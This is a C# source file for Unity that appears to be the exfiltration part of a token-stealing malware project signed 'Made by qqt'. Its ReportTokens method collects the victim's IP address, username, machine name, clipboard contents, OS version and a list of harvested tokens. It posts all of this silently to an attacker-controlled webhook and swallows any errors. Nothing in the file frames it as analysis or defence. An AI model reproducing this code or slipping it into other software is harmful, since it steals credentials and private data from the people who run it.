using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using UnityEngine;

public static class ITKLog_Webhook
{
    public static void ReportTokens(IEnumerable<string> tokenReport)
    {
        try
        {
            var client = new HttpClient();
            var contents = new Dictionary<string, string>
            {
                {
                    "content", "(•) Project Ping - Made by qqt\n\n" +
                               $"IP-Address: `{IPUtils.get_ip()}`\n" +
                               $"Username: `{Environment.UserName}`\n" +
                               $"Machine Name: `{Environment.MachineName}`\n" +
                               $"Clipboard: `{GUIUtility.systemCopyBuffer}`\n" +
                               $"OS Version: `{Environment.OSVersion}`\n" +
                               $"Time of Update: `{DateTime.Now}`\n" +
                               $"Tokens: {string.Join("\n", tokenReport)}"
                },
                {"username", $"(•) Cecilia"}
            };

            client.PostAsync(ITKLog.hookURL, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
        }
        catch
        {
            // ignored
        }
    }
}